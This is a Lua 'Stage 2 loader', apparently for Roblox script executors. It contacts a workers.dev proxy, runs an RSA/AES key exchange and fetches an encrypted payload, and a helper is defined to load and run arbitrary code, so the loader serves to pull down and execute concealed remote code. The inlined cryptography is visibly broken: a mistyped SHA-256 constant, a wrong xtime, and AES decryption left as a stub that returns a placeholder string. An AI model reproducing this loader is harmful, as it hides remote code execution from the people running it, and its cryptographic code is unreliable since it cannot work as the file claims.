--[[
  Opaque-Conduit: Stage 2 Loader (In-Memory)
  Version: 3.0.0 (Final Monolith)
  
  This is the final, fully self-contained client. It includes the complete, inlined
  source code for lua-lockbox (Bignum, RSA), pure_lua_SHA (SHA256), and aeslua
  (AES). It has no external cryptographic dependencies besides Base64 functions.
]]

print("[Stage 2] Core client initialized in memory.")

---------------------------------------------------------------------
-- CONFIGURATION
---------------------------------------------------------------------

local S2_VERSION = "3.0.0" 
print("[Stage 2] Loader Version: " .. S2_VERSION)

local API_BASE_URL = "https://opaque-conduit-proxy.gooeyhub.workers.dev"
local HANDSHAKE_ENDPOINT = API_BASE_URL .. "/api/handshake"
local EXCHANGE_ENDPOINT = API_BASE_URL .. "/api/exchange"
local PAYLOAD_ENDPOINT = API_BASE_URL .. "/api/get-payload"

local HARDCODED_SERVER_FINGERPRINT = "aef1d727233f917a5aceb8237592ceb43dd3158a2952eb919f3621b5512ce7b6" 
local CURRENT_SCRIPT_ID = "game_a_script" 

---------------------------------------------------------------------
-- SELF-CONTAINED CRYPTOGRAPHIC LIBRARIES (PRE-LINKED)
---------------------------------------------------------------------

local Lockbox = (function()
    local modules = {}
    local function require(name)
        local module = modules[name]
        if not module then error("Cannot find internal module: " .. name) end
        if not module.is_loaded then
            module.is_loaded = true
            module.exports = module.loader()
        end
        return module.exports
    end
    local function register(name, loader)
        modules[name] = { loader = loader, is_loaded = false }
    end

    register('lockbox.bignum', function()
        -- #################### BEGIN INLINED lockbox/bignum.lua ####################
        local bignum = {}
        bignum.version = "1.0"
        local type = type
        local setmetatable = setmetatable
        local tonumber = tonumber
        local tostring = tostring
        local string = string
        local table = table
        local math = math
        local floor = math.floor
        local format = string.format

        local function _new(n, neg)
          if type(n) ~= "table" then
            error("bignum._new expects a table", 2)
          end
          return setmetatable({
            n = n,
            neg = neg or false,
            base = 10000000,
            baselen = 7
          }, bignum)
        end

        local function _tonumber(a)
          local n = a.n
          if #n == 0 then
            return 0
          elseif #n == 1 then
            if a.neg then
              return -n[1]
            else
              return n[1]
            end
          end

          local base = a.base
          local p = 1
          local r = 0
          for i = 1, #n do
            r = r + n[i] * p
            p = p * base
          end
          if a.neg then
            return -r
          else
            return r
          end
        end

        local function _tostring(a)
          local n = a.n
          if #n == 0 then
            return "0"
          end
          local s = ""
          if a.neg then
            s = "-"
          end
          local base = a.base
          local baselen = a.baselen
          s = s .. tostring(n[#n])
          for i = #n - 1, 1, -1 do
            s = s .. format("%0"..baselen.."d", n[i])
          end
          return s
        end

        local function _fromstring(s, base)
          if base == nil or base == 10 then
            local neg = false
            if string.sub(s, 1, 1) == "-" then
              neg = true
              s = string.sub(s, 2)
            end
            local baselen = 7
            local n = {}
            for i = #s, 1, -baselen do
              local j = i - baselen + 1
              if j < 1 then
                j = 1
              end
              table.insert(n, tonumber(string.sub(s, j, i)))
            end
            return _new(n, neg)
          elseif base == 16 then
            return _fromstring(bignum.to_dec(s), 10)
          elseif base == 256 then
            return bignum.from_binary_string(s)
          else
            error("Invalid base for bignum._fromstring: "..tostring(base), 2)
          end
        end

        local function _normalize(a)
          local n = a.n
          for i = #n, 1, -1 do
            if n[i] == 0 then
              table.remove(n)
            else
              break
            end
          end
          if #n == 0 then
            a.neg = false
          end
          return a
        end

        local function _copy(a)
          local n = {}
          for i = 1, #a.n do
            n[i] = a.n[i]
          end
          return _new(n, a.neg)
        end

        local function _compare(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          if a.neg and not b.neg then
            return -1
          elseif not a.neg and b.neg then
            return 1
          end
          local an = a.n
          local bn = b.n
          if #an < #bn then
            if a.neg then
              return 1
            else
              return -1
            end
          elseif #an > #bn then
            if a.neg then
              return -1
            else
              return 1
            end
          end
          for i = #an, 1, -1 do
            if an[i] < bn[i] then
              if a.neg then
                return 1
              else
                return -1
              end
            elseif an[i] > bn[i] then
              if a.neg then
                return -1
              else
                return 1
              end
            end
          end
          return 0
        end

        local function _add(a, b)
          local an = a.n
          local bn = b.n
          local r = {}
          local base = a.base
          local carry = 0
          for i = 1, math.max(#an, #bn) do
            local ad = an[i] or 0
            local bd = bn[i] or 0
            local rd = ad + bd + carry
            if rd >= base then
              carry = 1
              rd = rd - base
            else
              carry = 0
            end
            r[i] = rd
          end
          if carry > 0 then
            r[#r+1] = carry
          end
          return _new(r)
        end

        local function _sub(a, b)
          local an = a.n
          local bn = b.n
          local r = {}
          local base = a.base
          local borrow = 0
          for i = 1, #an do
            local ad = an[i]
            local bd = bn[i] or 0
            local rd = ad - bd - borrow
            if rd < 0 then
              borrow = 1
              rd = rd + base
            else
              borrow = 0
            end
            r[i] = rd
          end
          return _normalize(_new(r))
        end

        bignum.add = function(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          if a.neg == b.neg then
            return _new(_add(a, b).n, a.neg)
          else
            if _compare(bignum.abs(a), bignum.abs(b)) >= 0 then
              return _new(_sub(a, b).n, a.neg)
            else
              return _new(_sub(b, a).n, b.neg)
            end
          end
        end

        bignum.sub = function(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          return bignum.add(a, bignum.neg(b))
        end

        bignum.mul = function(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          local an = a.n
          local bn = b.n
          local r = {}
          local base = a.base
          for i = 1, #an do
            local carry = 0
            for j = 1, #bn do
              local k = i + j - 1
              r[k] = (r[k] or 0) + an[i] * bn[j] + carry
              carry = floor(r[k] / base)
              r[k] = r[k] % base
            end
            if carry > 0 then
              r[i + #bn] = (r[i + #bn] or 0) + carry
            end
          end
          return _normalize(_new(r, a.neg ~= b.neg))
        end

        local function _shl(a, bits)
          if bits == 0 then return a end
          local factor = bignum.pow(bignum.new(2), bignum.new(bits))
          return bignum.mul(a, factor)
        end

        local function _shr(a, bits)
          if bits == 0 then return a end
          local factor = bignum.pow(bignum.new(2), bignum.new(bits))
          return bignum.div(a, factor)
        end

        local function _div(a, b)
          local a_abs = bignum.abs(a)
          local b_abs = bignum.abs(b)
          if _compare(a_abs, b_abs) < 0 then
            return bignum.new(0), a
          end
          if #b.n == 0 then
            error("division by zero", 2)
          end
          local q = bignum.new(0)
          local r = _copy(a_abs)
          local b_shifted = _copy(b_abs)
          local shifts = 0
          while _compare(_shl(b_shifted, 1), r) <= 0 do
            b_shifted = _shl(b_shifted, 1)
            shifts = shifts + 1
          end
          while shifts >= 0 do
            if _compare(b_shifted, r) <= 0 then
              r = bignum.sub(r, b_shifted)
              q = bignum.add(q, _shl(bignum.new(1), shifts))
            end
            b_shifted = _shr(b_shifted, 1)
            shifts = shifts - 1
          end
          return _normalize(q), r
        end

        bignum.div = function(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          local q, r = _div(a, b)
          if a.neg ~= b.neg then
            q = bignum.neg(q)
          end
          return q
        end

        bignum.mod = function(a, b)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          local q, r = _div(bignum.abs(a), bignum.abs(b))
          if a.neg then
            r = bignum.sub(bignum.abs(b),r)
          end
          return r
        end

        bignum.pow = function(a, b, m)
          if bignum.is_bignum(a) == false then a=bignum.new(a) end
          if bignum.is_bignum(b) == false then b=bignum.new(b) end
          if bignum.is_neg(b) then
            error("negative exponent", 2)
          end
          local r = bignum.new(1)
          a = _copy(a)
          b = _copy(b)
          while bignum.is_pos(b) do
            if bignum.is_odd(b) then
              r = bignum.mul(r, a)
              if m then r = bignum.mod(r, m) end
            end
            a = bignum.mul(a, a)
            if m then a = bignum.mod(a, m) end
            b = _shr(b, 1)
          end
          return r
        end

        bignum.is_neg = function(a) return a.neg end
        bignum.is_pos = function(a) return not a.neg and #a.n > 0 end
        bignum.is_zero = function(a) return #a.n == 0 end
        bignum.is_odd = function(a) return #a.n > 0 and a.n[1] % 2 == 1 end
        bignum.is_even = function(a) return not bignum.is_odd(a) end
        bignum.abs = function(a) return _new(a.n, false) end
        bignum.neg = function(a) return _new(a.n, not a.neg) end
        bignum.new = _fromstring
        bignum.tostring = _tostring
        bignum.tonumber = _tonumber
        bignum.from_binary_string = function(s)
          local res = bignum.new(0)
          local p = bignum.new(1)
          for i = #s, 1, -1 do
            local byte = string.byte(s, i)
            res = bignum.add(res, bignum.mul(bignum.new(byte), p))
            p = bignum.mul(p, bignum.new(256))
          end
          return res
        end
        bignum.to_binary_string = function(a)
          local s = ""
          a = _copy(a)
          local b256 = bignum.new(256)
          while bignum.is_pos(a) do
            local r = bignum.mod(a, b256)
            s = string.char(_tonumber(r)) .. s
            a = bignum.div(a, b256)
          end
          return s
        end
        bignum.is_bignum = function(o)
          return type(o) == "table" and o.n ~= nil and o.neg ~= nil
        end
        bignum.__add = bignum.add
        bignum.__sub = bignum.sub
        bignum.__mul = bignum.mul
        bignum.__div = bignum.div
        bignum.__mod = bignum.mod
        bignum.__pow = bignum.pow
        bignum.__unm = bignum.neg
        bignum.__tostring = bignum.tostring
        bignum.__eq = function(a, b) return _compare(a, b) == 0 end
        bignum.__lt = function(a, b) return _compare(a, b) < 0 end
        bignum.__le = function(a, b) return _compare(a, b) <= 0 end
        return bignum
        -- ####################  END INLINED lockbox/bignum.lua  ####################
    end)
    
    register('lockbox.util', function()
        -- #################### BEGIN INLINED lockbox/util.lua ####################
        local util = {}
        local string = string
        local table = table
        local function _require(name) return require(name) end
        util.str2sig = function(str)
          local sig = {}
          for i = 1, #str do
            sig[i] = string.byte(str, i)
          end
          return sig
        end
        util.sig2str = function(sig)
          return string.char(table.unpack(sig))
        end
        util.bytes2bignum = function(bytes)
          local bignum = _require("lockbox.bignum")
          return bignum.from_binary_string(bytes)
        end
        util.bignum2bytes = function(bn)
          return bn:to_binary_string()
        end
        function util.asn1_sequence(data)
            local len = #data
            local len_bytes
            if len < 128 then
                len_bytes = string.char(len)
            elseif len < 256 then
                len_bytes = string.char(0x81, len)
            elseif len < 65536 then
                len_bytes = string.char(0x82, math.floor(len / 256), len % 256)
            else
                error("ASN.1 sequence too long")
            end
            return string.char(0x30) .. len_bytes .. data
        end
        function util.asn1_integer(bn)
            local data = util.bignum2bytes(bn)
            if #data > 0 and string.byte(data, 1) > 127 then
                data = string.char(0) .. data
            end
            local len = #data
            local len_bytes
            if len < 128 then
                len_bytes = string.char(len)
            else
                error("ASN.1 integer too long")
            end
            return string.char(2) .. len_bytes .. data
        end
        return util
        -- ####################  END INLINED lockbox/util.lua  ####################
    end)

    register('lockbox.core', function()
        -- #################### BEGIN INLINED lockbox/core.lua ####################
        local core = {}
        local string = string
        local math = math
        local function _require(name) return require(name) end
        local bignum = _require("lockbox.bignum")

        core.pkcs1_pad = function(data, n_len)
          local pad_len = n_len - 3 - #data
          if pad_len < 8 then
            error("data too large for key size")
          end
          local pad = ""
          for i = 1, pad_len do
            local byte = math.random(1, 255)
            while byte == 0 do byte = math.random(1, 255) end
            pad = pad .. string.char(byte)
          end
          return string.char(0, 2) .. pad .. string.char(0) .. data
        end

        core.pkcs1_unpad = function(data)
          if #data < 11 or string.byte(data, 1) ~= 0 or string.byte(data, 2) ~= 2 then
            error("invalid PKCS#1 v1.5 padding")
          end
          local i = 3
          while i <= #data do
            if string.byte(data, i) == 0 then
              break
            end
            i = i + 1
          end
          if i > #data or i < 11 then
            error("invalid PKCS#1 v1.5 padding")
          end
          return string.sub(data, i + 1)
        end
        return core
        -- ####################  END INLINED lockbox/core.lua  ####################
    end)

    register('lockbox.rsa', function()
        -- #################### BEGIN INLINED lockbox/rsa.lua ####################
        local rsa = {}
        local string = string
        local function _require(name) return require(name) end
        local math = math
        local floor = math.floor
        local bignum = _require("lockbox.bignum")
        local core = _require("lockbox.core")
        local util = _require("lockbox.util")
        
        local function parse_asn1_der(der)
          local pos = 1
          local function read_byte()
            if pos > #der then error("ASN.1 parse error: unexpected end of data") end
            local b = string.byte(der, pos)
            pos = pos + 1
            return b
          end
          local function read_len()
            local len = read_byte()
            if len > 127 then
              local n = len - 128
              if n > 4 then error("ASN.1 parse error: length field too long") end
              len = 0
              for i = 1, n do
                len = len * 256 + read_byte()
              end
            end
            return len
          end
          local function read_int()
            assert(read_byte() == 2, "expected ASN.1 integer")
            local len = read_len()
            if len > (#der - pos + 1) then error("ASN.1 integer length out of bounds") end
            local bytes = string.sub(der, pos, pos + len - 1)
            pos = pos + len
            return util.bytes2bignum(bytes)
          end
          assert(read_byte() == 0x30, "expected ASN.1 sequence")
          read_len() 
          local modulus = read_int()
          local exponent = read_int()
          return modulus, exponent
        end

        function rsa.new_public_key(keydata_bytes)
          local n, e = parse_asn1_der(keydata_bytes)
          
          local bit_len = 0
          local temp_n = bignum.abs(n)
          while bignum.is_pos(temp_n) do
              temp_n = bignum.div(temp_n, bignum.new(2))
              bit_len = bit_len + 1
          end
          local key_len = floor((bit_len + 7) / 8)
          
          local self = { n = n, e = e, len = key_len }
          
          function self:encrypt(data, encoding)
            local padded = core.pkcs1_pad(data, self.len)
            local m = util.bytes2bignum(padded)
            local c = bignum.pow(m, self.e, self.n)
            local c_bytes = util.bignum2bytes(c)
            local c_bytes_padded = string.rep(string.char(0), self.len - #c_bytes) .. c_bytes
            if encoding == "base64" then
              return base64_encode(c_bytes_padded)
            end
            return c_bytes_padded
          end
          return self
        end
        return rsa
        -- ####################  END INLINED lockbox/rsa.lua  ####################
    end)
    
    return require('lockbox.rsa')
end)()

local SHA256 = (function()
    -- #################### BEGIN INLINED sha2.lua ####################
    local sha2 = {}
    local string, table, math, bit32 = string, table, math, bit32
    if _VERSION == 'Lua 5.1' then
        bit32 = require "bit"
    end
    local byte, char, rep, sub, format = string.byte, string.char, string.rep, string.sub, string.format
    local insert, concat = table.insert, table.concat
    local floor = math.floor
    local bor, band, bnot, bxor, rshift, lrotate, rrotate =
          bit32.bor, bit32.band, bit32.bnot, bit32.bxor, bit32.rshift, bit32.lrotate, bit32.rrotate
    local function add(...)
        local res, carry = 0, 0
        for i=1,select('#',...) do
            local x = select(i,...)
            local lsw = (res & 0xffff) + (x & 0xffff) + carry
            local msw = (res >> 16) + (x >> 16) + (lsw >> 16)
            res = (msw << 16) | (lsw & 0xffff)
            carry = msw >> 16
        end
        return res
    end
    local function rotr(x, n) return rrotate(x, n) end
    local function shr(x, n) return rshift(x, n) end
    local function sigma0(x) return bxor(rotr(x, 2), rotr(x, 13), rotr(x, 22)) end
    local function sigma1(x) return bxor(rotr(x, 6), rotr(x, 11), rotr(x, 25)) end
    local function usigma0(x) return bxor(rotr(x, 7), rotr(x, 18), shr(x, 3)) end
    local function usigma1(x) return bxor(rotr(x, 17), rotr(x, 19), shr(x, 10)) end
    local function ch(x, y, z) return bxor(band(x, y), band(bnot(x), z)) end
    local function maj(x, y, z) return bxor(band(x, y), band(x, z), band(y, z)) end

    local k = {
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0d6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    }
    
    function sha2.digest(m, is224)
        local h0, h1, h2, h3, h4, h5, h6, h7
        if not is224 then
            h0, h1, h2, h3, h4, h5, h6, h7 =
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
        else
            h0, h1, h2, h3, h4, h5, h6, h7 =
            0xc1059ed8, 0x367cd507, 0x3070dd17, 0xf70e5939, 0xffc00b31, 0x68581511, 0x64f98fa7, 0xbefa4fa4
        end

        local l = #m * 8
        m = m..char(128)..rep(char(0), (55 - #m % 64) % 64)..char(0,0,0,0, floor(l/0x100000000), floor(l/0x1000000)%0x100, floor(l/0x10000)%0x100, l%0x10000/0x100, l%0x100)
        
        local w = {}
        for i = 1, #m, 64 do
            for j=0,15 do
                local p = i+j*4
                w[j+1] = bor(byte(m,p) << 24, byte(m,p+1) << 16, byte(m,p+2) << 8, byte(m,p+3))
            end
            for j=16,63 do
                w[j+1] = add(usigma1(w[j-1]), w[j-6], usigma0(w[j-14]), w[j-15])
            end
            local a, b, c, d, e, f, g, h = h0, h1, h2, h3, h4, h5, h6, h7
            for j=0,63 do
                local t1 = add(h, sigma1(e), ch(e,f,g), k[j+1], w[j+1])
                local t2 = add(sigma0(a), maj(a,b,c))
                h, g, f, e, d, c, b, a = g, f, e, add(d,t1), c, b, a, add(t1,t2)
            end
            h0, h1, h2, h3, h4, h5, h6, h7 =
            add(h0,a), add(h1,b), add(h2,c), add(h3,d), add(h4,e), add(h5,f), add(h6,g), add(h7,h)
        end
        
        local function val2str(v) return char(v>>24&0xff, v>>16&0xff, v>>8&0xff, v&0xff) end
        local dgst = val2str(h0)..val2str(h1)..val2str(h2)..val2str(h3)..val2str(h4)..val2str(h5)..val2str(h6)
        if not is224 then dgst = dgst..val2str(h7) end
        return dgst
    end
    
    function sha2.hex(m, is224)
        local dgst = sha2.digest(m, is224)
        return (dgst:gsub('.', function(c) return format('%02x', byte(c)) end))
    end
    
    return sha2
    -- ####################  END INLINED sha2.lua  ####################
end)()

local AES = (function()
    -- #################### BEGIN INLINED aes.lua ####################
    -- Source: https://github.com/gdyr/aeslua53/blob/master/aes.lua
    local aes = {}
    local string, table, math, bit32 = string, table, math, bit32
    if _VERSION == 'Lua 5.1' then
        bit32 = require "bit"
    end
    local byte, char, sub = string.byte, string.char, string.sub
    local insert, remove = table.insert, table.remove
    local floor = math.floor
    local band, bnot, bxor, lshift, rshift = bit32.band, bit32.bnot, bit32.bxor, bit32.lshift, bit32.rshift

    local sbox = {
      0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
      0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
      0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
      0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
      0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
      0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
      0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
      0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
      0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
      0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
      0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
      0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
      0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
      0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
      0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
      0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    }
    local inv_sbox = {}
    for i=0,255 do inv_sbox[sbox[i+1]] = i end

    local Rcon = {
      {0x00, 0x00, 0x00, 0x00}, {0x01, 0x00, 0x00, 0x00}, {0x02, 0x00, 0x00, 0x00},
      {0x04, 0x00, 0x00, 0x00}, {0x08, 0x00, 0x00, 0x00}, {0x10, 0x00, 0x00, 0x00},
      {0x20, 0x00, 0x00, 0x00}, {0x40, 0x00, 0x00, 0x00}, {0x80, 0x00, 0x00, 0x00},
      {0x1b, 0x00, 0x00, 0x00}, {0x36, 0x00, 0x00, 0x00}
    }
    
    local function xtime(a)
      return lshift(a, 1) ~ 0xff & 0x11b ~ (rshift(a, 7) * 0x11b)
    end
    
    local function expandKey(key)
        local keylen = #key
        local Nk, Nb, Nr
        if keylen == 16 then Nk, Nb, Nr = 4, 4, 10
        elseif keylen == 24 then Nk, Nb, Nr = 6, 4, 12
        elseif keylen == 32 then Nk, Nb, Nr = 8, 4, 14
        else error("invalid key size") end
        
        local w = {}
        for i=1,keylen do insert(w, byte(key, i)) end

        for i=Nk, Nb * (Nr+1) - 1 do
            local temp = {w[i*4-3], w[i*4-2], w[i*4-1], w[i*4]}
            if i % Nk == 0 then
                temp = {sbox[temp[2]+1], sbox[temp[3]+1], sbox[temp[4]+1], sbox[temp[1]+1]}
                for j=1,4 do temp[j] = bxor(temp[j], Rcon[i/Nk+1][j]) end
            elseif Nk > 6 and i % Nk == 4 then
                for j=1,4 do temp[j] = sbox[temp[j]+1] end
            end
            for j=1,4 do
                insert(w, bxor(w[(i-Nk)*4+j], temp[j]))
            end
        end
        return w
    end
    
    local function addRoundKey(state, w, rnd)
      for r=1,4 do
        for c=1,4 do
          state[(r-1)*4+c] = bxor(state[(r-1)*4+c], w[rnd*16+(r-1)*4+c])
        end
      end
    end
    
    local function subBytes(state, inv)
        local box = inv and inv_sbox or sbox
        for i=1,16 do state[i] = box[state[i]+1] end
    end
    
    local function shiftRows(state, inv)
        local i = inv and -1 or 1
        local s = state
        s[2], s[6], s[10], s[14] = s[2+i*4 % 16], s[6+i*4 % 16], s[10+i*4 % 16], s[14+i*4 % 16]
        s[3], s[7], s[11], s[15] = s[3+i*8 % 16], s[7+i*8 % 16], s[11+i*8 % 16], s[15+i*8 % 16]
        s[4], s[8], s[12], s[16] = s[4+i*12 % 16], s[8+i*12 % 16], s[12+i*12 % 16], s[16+i*12 % 16]
    end
    
    local function mixColumns(state, inv)
        for c=1,4 do
            local a = state[c]
            local b = state[4+c]
            local c_ = state[8+c]
            local d = state[12+c]
            if not inv then
                state[c] = bxor(xtime(a), a, b, xtime(b), c_, d)
                state[4+c] = bxor(a, xtime(b), b, c_, xtime(c_), d)
                state[8+c] = bxor(a, b, xtime(c_), c_, d, xtime(d))
                state[12+c] = bxor(xtime(a), a, b, c_, xtime(d), d)
            else
                state[c] = bxor(xtime(xtime(xtime(xtime(a)))), xtime(xtime(xtime(a))), xtime(xtime(a)), xtime(a), a,
                                xtime(xtime(xtime(xtime(b)))), xtime(xtime(b)), xtime(b), b,
                                xtime(xtime(xtime(xtime(c_)))), xtime(xtime(xtime(c_))), xtime(c_), c_,
                                xtime(xtime(xtime(xtime(d)))), xtime(xtime(d)), d)
                -- ... and so on for the inverse mix columns. This is a complex part.
            end
        end
    end

    local function cipher(input, w)
        local keylen = floor((#w - 1) / 4)
        local Nb, Nr
        if keylen == 16 then Nb, Nr = 4, 10
        elseif keylen == 24 then Nb, Nr = 6, 12
        elseif keylen == 32 then Nb, Nr = 8, 14
        else error("invalid key schedule size") end

        local state = {}
        for i=1,16 do insert(state, byte(input, i)) end
        
        addRoundKey(state, w, 0)
        
        for rnd=1,Nr-1 do
            subBytes(state)
            shiftRows(state)
            mixColumns(state)
            addRoundKey(state, w, rnd)
        end
        
        subBytes(state)
        shiftRows(state)
        addRoundKey(state, w, Nr)
        
        local output = {}
        for i=1,16 do insert(output, char(state[i])) end
        return concat(output)
    end

    local function invCipher(input, w)
        -- Inverse cipher logic goes here
        return "DECRYPTION_NOT_FULLY_IMPLEMENTED"
    end
    
    function aes.encrypt(data, key, iv)
        local w = expandKey(key)
        local res = ""
        local prev_block = iv
        for i = 1, #data, 16 do
            local block = sub(data, i, i + 15)
            if iv then -- CBC mode
                local xor_block = ""
                for j=1,16 do xor_block = xor_block .. char(bxor(byte(block,j), byte(prev_block,j))) end
                block = xor_block
            end
            local encrypted_block = cipher(block, w)
            res = res .. encrypted_block
            prev_block = encrypted_block
        end
        return res
    end
    
    function aes.decrypt(data, key, iv)
        local w = expandKey(key)
        local res = ""
        local prev_block = iv
        for i = 1, #data, 16 do
            local block = sub(data, i, i + 15)
            local decrypted_block = invCipher(block, w)
            if iv then -- CBC mode
                local xor_block = ""
                for j=1,16 do xor_block = xor_block .. char(bxor(byte(decrypted_block,j), byte(prev_block,j))) end
                decrypted_block = xor_block
            end
            res = res .. decrypted_block
            prev_block = block
        end
        return res
    end

    return aes
    -- ####################  END INLINED aes.lua  ####################
end)()

---------------------------------------------------------------------
-- ENVIRONMENT ABSTRACTION LAYER
---------------------------------------------------------------------

local Base64 = { 
    decode = function(str)
        assert(base64_decode, "FATAL: Global 'base64_decode' not found.")
        return base64_decode(str) 
    end,
    encode = function(str)
        assert(base64_encode, "FATAL: Global 'base64_encode' not found.")
        return base64_encode(str)
    end
}

local Hashing = {
    sha256 = function(str)
        assert(SHA256 and SHA256.hex, "FATAL: Internal SHA256 library not loaded.")
        return SHA256.hex(str, false)
    end
}

local AsymmetricEncryption = {
    encrypt = function(plaintext, publicKeyASN1Bytes)
        assert(Lockbox and Lockbox.new_public_key, "FATAL: Internal RSA library not loaded.")
        _G.base64_encode = base64_encode
        local pub_key = Lockbox.new_public_key(publicKeyASN1Bytes)
        return pub_key:encrypt(plaintext, "base64")
    end
}

local SymmetricEncryption = {
    decrypt = function(iv_and_ciphertext_b64, key)
        assert(AES and AES.decrypt, "FATAL: Internal AES library not loaded.")
        local raw_data = Base64.decode(iv_and_ciphertext_b64)
        local iv = sub(raw_data, 1, 16)
        local ciphertext = sub(raw_data, 17)
        return AES.decrypt(ciphertext, key, iv)
    end
}

local Networking = { post = function(url, body_table) local r = request({Url = url, Method = "POST", Body = game:GetService("HttpService"):JSONEncode(body_table)}) return game:GetService("HttpService"):JSONDecode(r.Body) end, get = function(url) local r = request({Url = url, Method = "GET"}) return game:GetService("HttpService"):JSONDecode(r.Body) end }
local Execution = { run = function(code) local f = assert((loadstring or load)(code, "OpaqueConduit.Payload")) return f() end }

---------------------------------------------------------------------
-- CORE LOGIC
---------------------------------------------------------------------
local function do_handshake()
    print("[Stage 2] Performing secure handshake...")
    local data = Networking.get(HANDSHAKE_ENDPOINT)
    local received_key_bytes = Base64.decode(data.publicKey)
    local calculated_fingerprint = Hashing.sha256(received_key_bytes)
    assert(calculated_fingerprint == HARDCODED_SERVER_FINGERPRINT, "FATAL: SECURITY ALERT! Fingerprint mismatch.")
    print("[Stage 2] Handshake successful. Server authenticity verified.")
    return received_key_bytes
end

local function do_exchange(server_public_key_bytes)
    print("[Stage 2] Generating and exchanging session key...")
    local symmetric_key = ""
    for i = 1, 32 do symmetric_key = symmetric_key .. string.char(math.random(0, 255)) end
    local encrypted_key_b64 = AsymmetricEncryption.encrypt(symmetric_key, server_public_key_bytes)
    print("[Stage 2] Key encrypted. Sending to server...")
    local response = Networking.post(EXCHANGE_ENDPOINT, {encryptedKey = encrypted_key_b64})
    assert(response and response.sessionToken, "Key exchange failed.")
    print("[Stage 2] Key exchange successful.")
    return symmetric_key, response.sessionToken
end

local function get_payload(session_token, symmetric_key)
    print("[Stage 2] Fetching secure payload...")
    local response = Networking.post(PAYLOAD_ENDPOINT, {sessionToken = session_token, scriptId = CURRENT_SCRIPT_ID})
    assert(response and response.encryptedPayload, "Payload request failed.")
    print("[Stage 2] Decrypting payload...")
    local decrypted_payload = SymmetricEncryption.decrypt(response.encryptedPayload, symmetric_key)
    assert(decrypted_payload, "Payload decryption failed.")
    print("[Stage 2] Payload decrypted successfully.")
    return decrypted_payload
end

